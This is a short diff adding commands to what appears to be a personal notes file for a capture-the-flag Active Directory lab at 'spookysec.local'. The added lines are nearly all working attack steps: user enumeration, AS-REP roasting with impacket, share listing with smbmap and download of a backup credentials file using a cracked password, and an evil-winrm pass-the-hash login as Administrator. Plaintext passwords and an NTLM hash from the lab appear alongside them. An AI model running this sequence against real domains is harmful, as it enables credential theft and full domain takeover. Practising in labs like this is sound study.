@@ -1,2 +1,15 @@
 enum4linux -a spookysec.local
 kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt 
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+
+smbmap -H spookysec.local -d spookysec.local -R -u svc-admin -p management2005
+smbmap -H spookysec.local -d spookysec.local --depth 10 -R 'backup' -u svc-admin -p management2005
+smbmap -H spookysec.local -d spookysec.local --download 'backup/backup_credentials.txt' -u svc-admin -p management2005
+
+msfconsole (admin/smb/download_file)
+
+management2005
+backup@spookysec.local:backup2517860
+
+
+./evil-winrm.rb -i 10.10.157.232 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
